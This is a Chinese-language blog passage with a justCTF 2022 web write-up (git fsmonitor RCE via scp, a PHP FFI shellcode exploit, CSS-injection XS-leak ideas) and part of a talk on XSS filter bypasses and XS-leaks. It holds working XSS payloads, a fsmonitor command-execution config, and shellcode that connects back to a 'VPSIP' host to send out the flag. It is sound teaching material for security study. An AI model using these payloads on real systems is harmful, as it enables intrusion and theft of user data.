$_POST[&#39;domain&#39;]) !&#x3D;&#x3D; 0) &#123; highlight_file(__FILE__); &#125; else &#123; $dir &#x3D; &#39;&#x2F;tmp&#x2F;gitara&#39;.rand(); mkdir($dir); system(&quot; \\ cd $dir &amp;&amp; \\ timeout 2s sshpass -phunter2 scp -o StrictHostKeyChecking&#x3D;no &#39;justctf-gitara@$_POST[domain]:*&#39; . &amp;&amp; \\ timeout 1m git status; \\ rm -rf $dir&quot;); &#125; 其實目標很明顯，就是 chall server 會用 scp 從你的 server 去複製檔案，結束後執行 git status，所以你要利用 git 的一些特性來 RCE。 當時隊友有貼了一個這個 config： [core] repositoryformatversion &#x3D; 0 filemode &#x3D; true bare &#x3D; false logallrefupdates &#x3D; true fsmonitor &#x3D; &quot;echo \\&quot;Pwned as $(id)\\&quot;&gt;&amp;2; false&quot; 找到這邊好像有滿完整的解釋：2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md，不過有點長我還沒看就是了。 總之，如果把 gitconfig 換成上面這個內容，再用 git status 的話，就會執行 fsmonitor 後面的指令。 但這題的難處不是這個，而是在於你該怎麼樣把一個 git repo 丟到 chall server 上面去。 當你用 git init 以後，資料夾會多出一個 .git 資料夾，裡面有： HEAD config description hooks&#x2F; info&#x2F; objects&#x2F; refs&#x2F; 但 scp 時的指令是 server:*，所以： . 開頭的隱藏檔案不會配對到 資料夾不會抓下來，因為沒有用 -r 跟隊友研究了好一陣子，我發現調整一下 config 的話可以縮減到只需要四個檔案，然後也不需要 .git 資料夾： [core] repositoryformatversion &#x3D; 0 bare &#x3D; false worktree &#x3D; .&#x2F; fsmonitor &#x3D; &quot;echo \\&quot;Pwned as $(id)\\&quot;&gt;&amp;2; false&quot; 檔案結構如下： drwxr-xr-x 6 huli staff 192 6 14 22:00 . drwxr-xr-x 3 huli staff 96 6 14 21:57 .. -rw-r--r-- 1 huli staff 23 6 14 21:57 HEAD -rw-r--r-- 1 huli staff 115 6 14 21:59 config drwxr-xr-x 4 huli staff 128 6 14 21:57 objects drwxr-xr-x 4 huli staff 128 6 14 21:57 refs 在底下的資料夾執行 git status 就會跑 fsmonitor 的指令了。 但是 objects 跟 refs 這兩個資料夾必須存在，我有試圖用檔案來取代但是檢查過不了，後來還跑去翻 git 原始碼，看它到底怎麼檢查的，相關程式碼在這： https://github.com/git/git/blob/master/setup.c#L341 /* * Test if it looks like we're at a git directory. * We want to see: * * - either an objects/ directory _or_ the proper * GIT_OBJECT_DIRECTORY environment variable * - a refs/ directory * - either a HEAD symlink or a HEAD file that is formatted as * a proper \"ref:\", or a regular file HEAD that has a properly * formatted sha1 object name. */ int is_git_directory(const char *suspect) &#123; struct strbuf path = STRBUF_INIT; int ret = 0; size_t len; /* Check worktree-related signatures */ strbuf_addstr(&amp;path, suspect); strbuf_complete(&amp;path, '/'); strbuf_addstr(&amp;path, \"HEAD\"); if (validate_headref(path.buf)) goto done; strbuf_reset(&amp;path); get_common_dir(&amp;path, suspect); len = path.len; /* Check non-worktree-related signatures */ if (getenv(DB_ENVIRONMENT)) &#123; if (access(getenv(DB_ENVIRONMENT), X_OK)) goto done; &#125; else &#123; strbuf_setlen(&amp;path, len); strbuf_addstr(&amp;path, \"/objects\"); if (access(path.buf, X_OK)) goto done; &#125; strbuf_setlen(&amp;path, len); strbuf_addstr(&amp;path, \"/refs\"); if (access(path.buf, X_OK)) goto done; ret = 1; done: strbuf_release(&amp;path); return ret; &#125; 不過沒看出什麼端倪，這題也沒解出來。 賽後才發現有一個細節看漏了：access(path.buf, X_OK)，這邊只檢查檔案有沒有 X，所以如果把檔案用 chmod +x 加上 x 的話，就可以通過檢查了。因此，可以在完全沒有資料夾的狀況底下，順利建出一個合法的 git repo。 但這題學到的不只如此，還有另一個 discord 的討論，作者以為需要 .git 這個檔案才行，但是 scp 的 :* 又不會配對到這檔案，怎麼辦呢？ 答案是：「改自己 server 的 scp」，像這樣： root@ip-172-31-28-181:&#x2F;usr&#x2F;bin# cat scp #!&#x2F;usr&#x2F;bin&#x2F;bash &#x2F;usr&#x2F;bin&#x2F;scp.orig -f .git HEAD config elf objects refs 為什麼這樣可以動？這跟 scp 的原理有關。 我原本一直以為 scp 就是一個程式可以透過 ssh 幫你把遠端檔案抓下來，後來才知道原來你的 server 也要裝 scp，而且 scp 同時會作為 server 跟 client 互相溝通，意思就是，當我在我的機器下 scp remote:* . 的時候，實際上是： local scp 執行 ssh 連到 remote local scp 呼叫 remote scp remote scp 把檔案清單發給 local scp local scp 把檔案抓下來 總之，配對到什麼檔案，是由 remote scp 用 -f 這個沒有在文件上的 flag 來發送的。因此我們可以看到上面的解法覆寫了 scp，就可以決定你要傳哪些檔案。 更詳細的介紹可參考： SCP - Familiar, Simple, Insecure, and Slow 粗析openssh 中scp代码逻辑 scp源码浅析 Baby XSLeak(7 solves)這題有寫了英文版，中文有點懶得再寫一次：https://blog.huli.tw/2022/06/14/en/justctf-2022-xsleak-writeup/ 簡單來說就是透過 &lt;object&gt; 的 onload time 來判斷 response 的大小，因為有更多內容的話照理來說會花更多時間 render，onload 就會更晚觸發。 Foreigner(5 solves)程式碼如下： &lt;?php // flag is being set every 5 seconds if(isset($_GET['FLAG']) &amp;&amp; filter_var($_SERVER['REMOTE_ADDR'],FILTER_VALIDATE_IP) === \"172.20.13.37\")&#123; $f=$_GET['FLAG']; if(strstr($f,\"justCTF&#123;\")) &#123; putenv(\"FLAG=$f\"); die(\"flag $f set\"); &#125; &#125; if(isset($_GET['x'])) &#123; putenv(\"FLAG=aaand_it's_gone\"); echo' &lt;style> div &#123; display: table; margin-right: auto; margin-left: auto; &#125; &lt;/style> &lt;body> &lt;div>&lt;img src=\"itsgone.gif\" width=\"497\" height=\"280\">&lt;/div> &lt;/body> '; eval($_GET['x']); &#125; else &#123; print(show_source(__file__, true)); &#125; 有 eval 可以執行任意程式碼，但是 disable_functions 裡面有一堆東西 最後的解法我也沒有看得很懂，看起來是要寫一些 shell code 搭配可以用的 function，附上 discord 裡面看到的解法(by Tony_Bamanaboni)： from pwn import * from binascii import hexlify context.arch = \"amd64\" payload = \"addr: .quad 0\\nnop\\nnop\\nnop\\nnop\\nnop\" payload += \"\"\" call $+5 pop r13 and r13, -4096 mov r13, [r13] \"\"\" payload += shellcraft.amd64.linux.connect(\"VPSIP\", 6666) payload += shellcraft.amd64.linux.egghunter(b'CTF&#123;') payload += \"\"\"mov rsi, rdi mov rdi, rbp mov rdx, 50 mov rax, 1 syscall ret \"\"\" payload = hexlify(asm(payload)).decode() php = ''' $pl=hex2bin(\"%s\"); $l=FFI::cdef(\"char* mmap(int,int,int,int,int,int);void alarm(int);void signal(int,void*);\",\"libc.so.6\"); $p=$l->mmap(0,0x1000,7,0x21,-1,0); $p2=$l->environ; FFI::memcpy($p,FFI::addr($p2),8); for($idx=8;$idx&lt;strlen($pl);$idx++)&#123;$p[$idx]=$pl[$idx];&#125; $l->signal(14,$p+8); $l->alarm(5); ''' % payload print(php.replace('\\n', '').replace('+', '%2b')) Web API intended(4 solves)這題就給你一個 API 文件，可以註冊、登入、修改資料跟建立一些資料等等。 當時在打的時候看到 jwt 裡面有個 /jwk 的網址，試著改成別的發現沒收到 request，就先跑去玩其他題了。 事後從 discord 的討論看來，解法是更改使用者資料有個 mass assignment 的 bug，可以把自己改成 is_admin: true，接著別的 endpoint 有吃 XML，就 XXE 然後讀 &#x2F;flag.txt，結束 概念看起來似乎不太難，不過畢竟是黑箱所以比較多東西需要去測試，有時候可能試幾條路卡住以後，就會先去解白箱的題目了。 Ninja(1 solves)有趣的 XSleak 題，把我能想到的 unintended 全部都擋掉了。 這題的核心程式碼如下： &#123;% extends \"base.html\" %&#125; &#123;% block css %&#125; &lt;style> .consent_color &#123; color: &#123;&#123; consent.color_palette &#125;&#125; &#125; &lt;/style> &#123;% endblock %&#125; &#123;% block content %&#125; &lt;section class=\"container\" id=\"generate-form\"> &lt;div class=\"row g-4\"> &lt;div class=\"col-lg-6 col-md-8 mx-auto\"> &lt;h2 class=\"mb-3\">Cookie consent&lt;/h2> &lt;hr class=\"my-4\" /> &lt;div class=\"col-10\"> &lt;div class=\"card shadow-sm\"> &lt;div class=\"card-body\"> &lt;div class=\"d-flex justify-content-between align-items-center\"> &lt;div class=\"btn-group \"> &lt;!--FIX: reported HTML injection, added filters --> &lt;a href=\"#&#123;&#123;link|replace('&lt;',\"&amp;gt;\")|replace('>',\"&amp;lt;\")|safe&#125;&#125;\">Open Preferences&lt;/a> &lt;/div> &lt;small class=\"text-muted\">❤️&lt;/small> &lt;/div> &lt;/div> &lt;/div> &lt;/div> &lt;/div> &lt;/div> &lt;/section> &#123;% endblock %&#125; 可以很明顯看到 CSS injection（server 有擋最多 140 個字），還有 &lt;a&gt; 的 href 控制跟任意屬性新增。 而 flag 就是 admin user，出現在更上面的地方，內容長這樣： &lt;div class=\"nickname\">Hello, &lt;span>A&lt;/span>&lt;span>e&lt;/span>&lt;span>f&lt;/span>&lt;span>2&lt;/span>&lt;span>i&lt;/span>&lt;span>k&lt;/span>&lt;span>o&lt;/span>&lt;span>f&lt;/span>&lt;span>j&lt;/span>&lt;span>2&lt;/span>&lt;span>o&lt;/span>&lt;span>i&lt;/span>&lt;span>f&lt;/span>&lt;span>1&lt;/span>&lt;span>1&lt;/span>&lt;span>2&lt;/span>&lt;span>3&lt;/span>&lt;span>1&lt;/span>&lt;span>2&lt;/span>&lt;span>3&lt;/span>&lt;span>1&lt;/span>!&lt;/div> CSP 的話長這樣： default-src ‘none’; font-src http://ninja.web.jctf.pro/static/; form-action ‘self’; object-src ‘none’; script-src http://ninja.web.jctf.pro/static/; base-uri ‘none’; style-src http://ninja.web.jctf.pro/static/ ‘unsafe-inline’; img-src * data:; 基本上只有 img 暢通無阻，其他都被擋掉。 然後還有一個關鍵點是這題的 bot 裝了一個叫做 ninja cookie 的套件，從敘述看來是會自動去點擊不接受 cookie 的按鈕之類的，這題的 bot 也是很經典，擋了一大堆東西： import traceback from selenium import webdriver from selenium.webdriver.chrome.options import Options from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support import expected_conditions as EC from selenium.webdriver.common.by import By import os from flask import Flask, request import time app = Flask(__name__) import sys import logging TASK = os.environ.get('BASE_URL') or \"http://127.0.0.1:5000\" flag = os.environ.get('FLAG') or 'justCTF&#123;fake&#125;' pwd = os.environ.get('PASSWD') or 'admin' def visit_url(url, timeout): if type(url) != str or not url.startswith(\"http\"): return print(\"Visiting:\",url, file=sys.stdout, flush=True) options = Options() options.add_argument('no-sandbox') options.add_argument('disable-dev-shm-usage') options.add_argument('disable-infobars') options.add_argument('disable-background-networking') options.add_argument('disable-default-apps') options.add_argument('disable-gpu') options.add_argument('disable-sync') options.add_argument('disable-translate') options.add_argument('disable-lazy-image-loading') options.add_argument('hide-scrollbars') options.add_argument('metrics-recording-only') options.add_argument('mute-audio') options.add_argument('no-first-run') options.add_argument('dns-prefetch-disable') options.add_argument('safebrowsing-disable-auto-update') options.add_argument('media-cache-size=1') options.add_argument('disk-cache-size=1') options.add_argument('disable-features=LazyImageLoading,AutomaticLazyImageLoading,LazyFrameLoading,AutomaticLazyFrameLoading,AutoLazyLoadOnReloads') options.add_argument('--js-flags=--noexpose_wasm,--jitless') options.add_argument('hide-scrollbars') options.add_argument('load-extension=ninja-cookie') try: browser = webdriver.Chrome('/usr/local/bin/chromedriver', options=options, service_args=['--verbose', '--log-path=/tmp/chromedriver.log']) browser.get(TASK+\"/login\") WebDriverWait(browser, 5).until(lambda r: r.execute_script('return document.readyState') == 'complete') inputElement = browser.find_element_by_id(\"username\") inputElement.send_keys(flag) inputElement = browser.find_element_by_id(\"password\") inputElement.send_keys(pwd) browser.find_element_by_id(\"submit\").click() WebDriverWait(browser, 5).until(lambda r: r.execute_script('return document.readyState') == 'complete') time.sleep(timeout) browser.get(url) WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete') time.sleep(30) except: print('Error visiting', url, traceback.format_exc(), file=sys.stderr, flush=True) finally: print('Done visiting', url, file=sys.stderr, flush=True) @app.route(\"/\", methods=['GET']) def visit(): visit_url(request.args.get(\"url\"), 1) return \"ok\" 先來講一下我看到這題之後的想法，因為 CSS injection 可以做，內容又在頁面上，所以自然而然會想到 font-face 搭配 unicode-range 的做法，像這樣： @font-face &#123; font-family:\"A\"; src: url(https://example.com); unicode-range: U+006A; &#125; .nickname > span:nth-child(1) &#123; font-family: A1; &#125; 這樣只要 flag 的第一個字是 U+006A，就會套用指定的字體，不過這邊字體被 CSP 限制不能載入，所以這招過不了。 而我想到的另外一招是用 size-adjust 搭配 local font： @font-face &#123; font-family:\"A\"; src: local(Arial); size-adjust: 1000%; unicode-range: U+006A; &#125; .nickname > span:nth-child(1) &#123; font-family: A1; &#125; 畫面會變成這樣： 我原本的想法是，假設 ninja cookie 會偵測到「按鈕出現在畫面上」才去點擊，那我就可以用上面這招把按鈕推離畫面，ninja cookie 就不會點。然後如果字體沒有配對到，按鈕就不會被推走，就會點到按鈕。透過這個 oracle 來 leak 出 flag。 不過有兩個問題，第一個問題是上面的截圖可以看到字體放大是往右跟往上長，推不到下面的內容。這個倒是好解決，我們用 CSS 更改一下排版，就可以讓版面橫著長： 第二個問題最為致命，那就是 ninja cookie 的 :visible 是指一個元素是否有寬高，有的話都是 visible，所以出不出現在畫面上是沒差的，因此這招就 gg 了。 我想到的第二個招式是 cache probing，可以這樣寫： @font-face &#123; font-family: \"A1\"; src: url(/static/bootstrap.min.css?q=1); unicode-range: U+0041; &#125; 如果有配對到，字體就會載入 /static/bootstrap.min.css?q=1，雖然說不會載入成功，但是瀏覽器應該會保存 cache，就算沒有 cache，也有 304 not modified 的機制，response 應該會比其他東西快。 不過實測過後發現第一是速度其實沒差多少，第二是 bot 裡面用了 disk-cache-size=1 這個 flag，不得不說考慮的真是周到。 順帶一提，常用的 scroll bar 跟 lazy loading image 也都被封掉了。 我想到的第三招是我們可以這樣做： @font-face &#123; font-family: \"A1\"; src: url(/static/bootstrap.min.css?q=1), url(/static/bootstrap.min.css?q=2), .... url(/static/bootstrap.min.css?q=500); unicode-range: U+0041; &#125; 因為 bot 的程式碼是長這樣： browser.get(url) WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete') time.sleep(30) 假設字體沒有配對到，那造訪 bot 後拿到 response 時間應該是 30 秒上下。如果有配對到，就會發出一堆 request 去拿字體，network 就會一直有東西，就會更晚才符合停止條件，拿到 response 的時間就會更久。 所以從 response 時間可以得到有沒有配對成功。 但這招也行不通，因為 CSS 最多只能 140 個字。 還有其他招我沒有去試的，例如說可以結合一開始提到的 size-adjust 跟 animation，有符合的話就一直瘋狂切換字體，像這樣： @keyframes t &#123; 0% &#123; font-family: A1; &#125; 50% &#123; font-family: rest; &#125; &#125; @font-face &#123; font-family: \"A1\"; size-adjust: 1000%; src: local(Arial); unicode-range: U+0041; &#125; .nickname > span:nth-child(1) &#123; font-family: A1; animation: 0.01s t 0 infinite; &#125; 這樣一直切換字體，寬度就會一直變，layout 就要一直重排，應該會比較耗效能，只要能找到方式偵測這點就行了。 第一種可能是 ninja cookie 點擊的速度會變慢，但想了想 extension 應該是別的 thread 在負責，雖然沒測過就是了。第二種可能是 iframe 把網站跟自己的 exploit 疊起來，再用一些 JS 去算這件事，但因為這題有擋 iframe 所以也無法。 總之呢，這只是個想法而已，但要實作或是要成功應該還有一段距離。 底下來講一下官方解法，利用了 :target 這個 selector 搭配 :before 來載入背景圖片。 我知道有 ::target-text 來配對到 highlight 的部分，但之前看過只有部分屬性可以用，不知道原來 :target 也會配對到。 所以這題解法就是利用 :target:before 來載入圖片，然後用 HTML injection + ninja cookie 的點擊來觸發 scroll。 完整解法可看：https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb 相關技術可看：New technique of stealing data using CSS and Scroll-to-Text Fragment feature. Dank Shark(0 solves)這題完全沒看，不太知道在幹嘛，以後有機會再回來看（雖然這樣寫就代表九成九不會再回來看）。 先附一下 discord 中討論串的解法： use 0day request smugling in js_challange module just write short 64length xss in nickname (iptables was not working on remote) use cache poisoning&#x2F;golang sync.pool buffer bug (if you close http connection without reading you have leak in next connection)","link":"/2022/06/14/justctf-2022-writeup/"},{"title":"接觸資安才發現我不懂前端","text":"此文章是我在 Modern Web 2021 的分享：《接觸資安才發現前端的水真深》的文字版，當時的演講影片尚未釋出，想看簡報的話在這邊：slides 我自己覺得影片加上簡報的效果應該會比文字好，但想說用文字留一份紀錄也不錯，因此還是寫了這篇文章，內容會有些許與影片不同，有點像是再重新寫了一遍。 原來我不懂前端這個標題是我接觸到資安的世界以後，最真實的想法。 身為一個前端工程師，自認為對前端頗為熟悉，無論是原生的 JavaScript 還是一些框架或函式庫，多少都用過或者聽過，連看到許多奇形怪狀的 JavaScript 題目也不會感到太過驚訝，覺得已經沒什麼能讓我「哇！」這樣的驚嘆。 直到我接觸了資安相關的東西，才知道是我太天真。 前端工程師所接觸的前端，跟資安工程師所看到的前端是兩個不同的面向。資安的重點在於各式各樣的攻擊手法，要想辦法繞過既有的限制，找到一條新的道路。但是前端工程師根本不需要知道那些東西，因為他是在沒有限制的狀況下來寫 code 的。 這陣子有玩了一些 CTF，對於前端也從另一個角度看了一陣子，學到很多新的前端知識，換句話說，我在一個新的領域（資安）重新學習到了我原本熟悉的領域（前端）的知識，這種感覺十分特別，因此這篇文章想跟大家分享我學到的一些東西，希望能讓大家感受到我當初的驚訝。 此文章分成三個主題： 繞過各種限制 XS leaks 其他你可能不知道的功能 繞過各種限制談到前端安全，第一個想到的想必是 XSS，有關 XSS 的文章跟介紹之前寫過不少了，有興趣的話可以參考：XSS 從頭談起：歷史與由來，這邊就不再贅述。 一個最簡單直覺的 XSS payload 會長這樣： &lt;script>alert(1)&lt;/script> 但這種形式的 XSS 不夠有趣，而且很容易被防禦住，所以我們先暫時不講這個，來看一些比較有趣的，例如說這個： &lt;img src=non_exist onerror=alert(1)> 這一段 HTML 利用 event handler 的方式去執行 JavaScript，我們載入一張不存在的圖片，就會觸發 onerror 事件，執行到裡面的程式碼。還有一點值得注意的是，其實屬性不需要加 &quot;&quot; 也可以。 還可以再更進一步，變成這樣： &lt;svg onload=alert(1)> 這次連 src 都不需要了，直接用 &lt;svg&gt; 搭配 onload 事件去執行程式碼。 假設小明是一位後端工程師，責任是去過濾這些輸入的字串，讓它不要產生 XSS 漏洞，除了過濾 &lt;script&gt; 以外，小明也過濾了空格。理由很簡單，像是這種用屬性來執行的 XSS，屬性跟標籤之間一定要有空格對吧？那一旦把空格濾掉，不就沒辦法利用屬性來做 XSS 了嗎？ 天真的小明踢到了鐵板，因為其實可以這樣： &lt;svg/onload=alert(1)> &lt;svg onload=alert(1)> &lt;svg onload=alert(1)> 除了空格以外，/、tab 還有換行都是合法的分隔符號，所以如果只取代空格的話是沒有用的。 小明知道這個規則以後，察覺到根本問題其實不是空格，而是 onxxx 這種以 on 開頭的 event handler，於是他把 on 開頭的屬性全都過濾掉了，心想：「只要沒辦法用 event handler，就沒辦法 XSS 吧？」 聽起來十分合理，但他不知道的是，就算沒有 event handler 也可以： &lt;iframe/src=\"javascript:alert(1)\"> javascript: 開頭的字串稱為 JavaScript pseudo protocol，在一些地方可以用來執行程式碼，之前我們在《在做跳轉功能時應該注意的問題：Open Redirect》中就有提過這個特性。 小明的防禦再度破功，只好再次加強，把 javascript 這個看起來很危險的字串取代掉，這樣應該就沒事了吧？ 殊不知，原來在 javascript 這幾個字中間塞入 tab 以後，居然還是有效： &lt;iframe/src=\"javas cript:alert(1)\"> 小明修正了程式碼，把那些有的沒的像是空白、空行或是 tab 全都取代成空字串，然後再檢查一次有沒有 javascript，有的話就過濾掉，如此一來，上面的 payload 就無法運作了。 但小明忘記網頁上的資訊是可以編碼的，例如說你想在畫面上呈現 &lt;h1&gt;，你要編碼成 &amp;lt;h1&amp;gt;，這樣畫面呈現的是你要的東西，而不是被當作 h1 標籤來解析。除了那些特殊符號，一般的文字也可以用 &amp;#&#123;ascii_code&#125;; 來編碼，例如說 j 的 ascii code 是 106，就可以編碼成 &amp;#106;： &lt;iframe/src=\"&amp;#106;avascript:alert(1)\"> 如果你想要的話，可以把整串字全部都編碼，就只會剩下一些符號跟數字而已。 惱怒的小明這次不演了，直接禁用 src 屬性，想說「那我把 src 都禁用就沒事了吧？不要再來煩我了！」 但他忘記的事情是，&lt;a&gt; 也可以用這個屬性： &lt;a/href=\"&amp;#106;avascript:alert(1)\">點我&lt;/a> 只是這次就不會自動觸發了，需要使用者主動點擊才能觸發。 最後小明真的受不了了，於是覆蓋了一張 DOMPurify，結束這個回合。 除了上面的這些標籤跟屬性的繞過以外，JavaScript 本身的繞過也滿好玩的，例如說：「有沒有辦法在不使用 () 的狀況下執行函式？」 如果你有用過 React 的 styled-components 或類似的東西，應該寫過像這樣的程式碼： const Box = styled.div` background: red; ` 為什麼這樣就可以產生出一個 component 呢？這是因為反引號除了可以用來當作 template string 以外，也可以拿來當作函式呼叫，這我在 Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼裡面有提到過。 所以可以這樣寫： alert`1` 那如果現在連反引號都不能用呢？有沒有其他方法？ 有一個我第一次看到的時候讚嘆了許久的方法： onerror=alert;throw 1 它把 window.onerror 改寫成 alert，再拋出一個錯誤，而這個錯誤因為沒有被 catch 到，就會被 window.onerror 接住，最後被丟到 alert 裡面執行。 除了 alert 以外，改寫一下就可以執行任意程式碼： onerror=eval; throw \"=alert\\x281\\x29\" 第一行跟剛剛一樣，只是這次把 onerror 變成了 eval，但第二行是在做什麼呢？先講一下那個 \\x28 跟 \\x29，分別是 () 的編碼。 但為什麼前面多一個 =？ 這是因為把錯誤拋出去的時候，如果是 Chrome，它最後會產生的字串是：Uncaught &#123;err_message&#125;，像是 throw 1，就會產生出 Uncaught 1，但這樣並不是一段 JavaScript 程式碼，丟到 eval 會直接噴出錯誤。 所以我們把 &quot;=alert\\x281\\x29&quot; 丟出去，就會變成 Uncaught=alert\\x281\\x29，整句變成了一個 expression，Uncaught 被當作是沒有宣告的全域變數，它的值是 alert(1) 的回傳值，如此一來，整段 error message 就變成合法的 JavaScript 程式碼了！利用這樣的方式丟給 eval，就可以正常執行。 其實還有一些更驚人的手法，但篇幅有限而且有些我也還在努力看懂，所以就先在此打住，以下圖做個總結： 字數限制除了上面那些屬性以及字元的限制以外，還有另一種限制叫做字數限制。 舉例來說，如果有個網站的暱稱有 XSS 漏洞，可是只能輸入最多 25 個字，這種情況下只跳出一個 alert 是沒有殺傷力的，你有辦法執行任意程式碼嗎？ 最短的 XSS payload &lt;svg/onload=&gt; 的這個骨架就有 13 個字了，因此我們只剩下 12 個字可以來執行程式碼，這時候就需要用到一個技巧，那就是「利用現有資訊」，像是這樣： // 13 + 18 = 31 字 &lt;svg/onload=eval(`'`+location)> 這短短的程式碼隱藏了不少細節，首先呢，如果你想拿到網址，你會怎麼做？location.href 嗎？更短的做法是把 location 轉成字串，你一樣能拿到網址。但網址本身不是合法的程式碼，所以我們要在前面加上一個單引號，接著再利用網址列上的 #，例如說這樣：https://example.com#&#39;;alert(1)，跟單引號拼起來就會變成： 'https://example.com#';alert(1) 這就是一段合法的 JavaScript 程式碼了，因為它變成一個字串後面接指令！ 除了 location 以外，document.URL 也可以拿到網址，但這字數明顯比 locaton 多，可是你知道嗎，document 可以省略，變成這樣： // 13 + 13 = 26 字 &lt;svg/onload=eval(`'`+URL)> 為什麼不需要寫 document？這是因為有個隱藏的規格，在 event handler 裡面的 inline 程式碼，預設就會有 document 這個 scope： 用 debugger 看也很明顯，所以儘管我們只輸入 URL，也會因為 scope 跟 with 的關係找到 document.URL 只差一個字就可以壓在 25 個字以內了，還有其他招式嗎？有，請先看一下底下的程式碼，你預期的輸出是什麼？ name = 123 console.log(typeof name === 'number') 應該是 true 對吧？123 是數字，十分合理啊！但如果你真的在瀏覽器上面執行，會發現輸出居然是 false，因為 typeof name 是 string！ 這是因為 name 是一個特別的屬性，它代表了這個視窗的名稱，或簡單一點也可以想成是這個分頁的名稱，換句話說，同一個分頁儘管內容不同，依然會共享同一個名稱！ 假設我要攻擊的網站是 example.com，我的網站是 huli.tw，我可以在我的網站底下這樣寫： &lt;script> name = 'alert(1)' window.location = 'http://example.com' &lt;/script> 設置完 name 以後跳轉過去目標網站，接著在目標網站輸入這組 payload： // 13 + 10 = 23 字 &lt;svg/onload=eval(name)> 因為 name 會共享的關係，就可以成功執行我想要的程式碼，這次只要 23 個字，成功壓在 25 個字以內。 有一個網站叫做 Tiny XSS Payloades，專門收集這些很短的 payload，裡面有更多千奇百怪的 payload，有需要的話可以參考看看，我所知道的 payload 也都是從這個網站來的。 XS leaks上面講完了一些限制的繞過以後，我們來看看另一個主題，叫做 Cross-Site Leaks（簡寫為 XS Leaks），這個攻擊其實就是網頁上的一種 side-channel attack，有關於 side-channel attack，我之前在 CORS 完全手冊（五）：跨來源的安全性問題裡面有提到過，用很知名的 Spectre 來舉例。 什麼是 side-channel attack 呢？就是你透過一些方法「間接」得知了資訊，例如說假設你面前有一個燈泡，但你的眼睛完全看不見，連光源都感受不到，你要怎麼知道這個燈泡現在是亮的還是不亮的？ 有一種方式是透過「溫度」，因為燈泡如果亮著會發光，可能會產生熱能（先假設這前提為真然後忽略一些 edge case，舉例用途而已），因此你摸燈泡的時候就感覺得到熱度，這就是透過溫度間接得知了燈泡亮不亮這個資訊。 把這個概念用在網頁上的話也是類似的，透過一些方法間接得知網頁上的資訊，我們來看兩個例子。 搜尋與下載假設現在有一個具有搜尋與下載功能的網站，可以在 query string 直接帶入想要搜尋的字串，例如說 https://example.com/download?q=example，如果資料庫裡面沒有符合的資料，就會出現一個「查無使用者」的畫面： 反之，如果有資料的話，就會直接跳出原生的檔案下載視窗，讓你直接下載相對應的檔案： 身為一個攻擊者，我們知道這個資訊以後可以做些什麼呢？ 假設我有一個自己的網站，網址是 https://huli.tw，接著我在我的網站上面把剛剛的範例網站用 iframe 嵌入： const iframe = document.createElement('iframe') iframe.src = \"https://example.com/download?q=user01\" document.body.appendChild(iframe) 這時候關鍵的來了，如果 user01 這筆資料不存在於資料庫裡面，當我試著存取 iframe.contentWindow.origin 的時候就會出錯，這是因為 huli.tw 跟 example.com 不是同源的網站，所以被瀏覽器的 Same-Origin Policy 擋了下來。 但是呢！如果 user01 這筆資料存在於資料庫裡面，不是就會直接跳出下載畫面嗎？這時候如果我去存取 iframe.contentWindow.origin，就不會出錯，因為我會拿到 null 這個結果。 所以我們可以根據存取 iframe.contentWindow.origin 的結果，得知某個關鍵字是否存在於資料庫裡面： const iframe = document.createElement('iframe') iframe.src = \"https://example.com/download?q=user01\" document.body.appendChild(iframe) // 先假設一秒後會載入完畢，可以做到更精確但先跳過 setTimeout(() => &#123; try &#123; iframe.contentWindow.origin console.log('使用者存在') &#125; catch(err) &#123; console.log('使用者不存在') &#125; &#125;, 1000) 這就是 XS leaks，我們明明在 A 網站，卻可以利用一些技巧去得知 B 網站的資訊。 完整的攻擊實作會把上面的攻擊腳本延伸，例如說先測 a 再測 b 之類的，假設測到 b 是存在的，那就重複剛剛的流程去測 ba, bb…，如此一來就可以洩漏出至少一組的使用者帳號。接著只要把這個網頁的連結傳給有權限存取到 https://example.com/download 頁面而且處於登入狀態下的人，點開以後攻擊就會啟動。 雖然說聽起來前置步驟有點多，但它確實是個可行的攻擊手法。 id 的奧妙假設現在有個標榜隱私度極高的社群網站，你沒有辦法看到你好友的好友有誰，看不到共同好友，所以你也不知道誰跟誰是朋友，只知道自己有哪些朋友。 你跟 user id 是 123 的 David 是好朋友，所以當你點進他的個人頁面：http://example.com/users/123 時，會看到一個按鈕「傳送訊息」，按鈕的 id 是 message： 而你跟 user id 是 210 的 Peter 並不是好友，所以點進他的頁面以後，會看到另一個按鈕叫做「加入好友」，id 是 add： 這聽起來都沒什麼問題，十分合理的實作，網頁上的元素有 id 再合理不過了。不過，其實這樣也會有 XS leaks 的風險。 瀏覽器有一個貼心的功能不知道大家有沒有注意過，當網址後面加上 #id 的時候，瀏覽器會自動跳到有這個 id 的段落然後把元素 focus（如果可以被 focus 的話），文章的錨點（anchor）功能就是靠這個，才能跳到特定的段落去。 因此當我連到 http://example.com/users/123#message 時，如果我跟 id 為 123 的人是好友，那頁面上就會出現傳送訊息的按鈕，瀏覽器就會跳到按鈕那邊並且把按鈕 focus。那如果我跟 123 不是好友呢？那就不會有任何事情發生。所以我們可以透過這個差異，來知道 id 123 的人是不是當前使用者的好友。 做法跟剛剛的搜尋下載很像，都是要先把目標網頁嵌入 iframe 之中，如果有這個 id 存在，那 iframe 就會 focus，而原本的 body 就會 blur： window.onblur = () => &#123; console.log('是好友') &#125; const iframe = document.createElement('iframe') iframe.src = 'https://example.com/users/123#message' document.body.appendChild(iframe) 接著把這個網頁傳給你想知道他好友狀況的人，他一打開網頁之後，你就能知道他跟 123 是不是好朋友。如果這個網站的 id 是流水號，你就可以遍歷每一個 id，得知他的好友清單裡面有誰。 以上就是兩個 XS leaks 的範例，都是透過一些瀏覽器或是 JS 的特性來達成的攻擊，如果你對這些有興趣，可以參考：XS-Leaks Wiki，裡面有更多更有趣的案例（我所知道的這些也是從這個網站來的） 如果想看 XS leaks 的實際案例，這邊有很多：Mass XS-Search using Cache Attack，而最近的這一個也很有趣：Abusing Slack’s file-sharing functionality to de-anonymise fellow workspace members 其他你可能不知道的功能最後一個段落裡面想跟大家分享一些「你可能不知道」的功能，或更精確一點來說，是「我知道以後很驚訝」的功能，我原本沒有想到原來可以這樣做。 讀取不同 path 的 cookie在設定 Cookie 的時候有許多參數可以設置，其中一個叫做 path，例如說我設定 cookie 的 path 是 /siteA，那當我在 /siteB 的時候，就沒辦法讀取到 /siteA 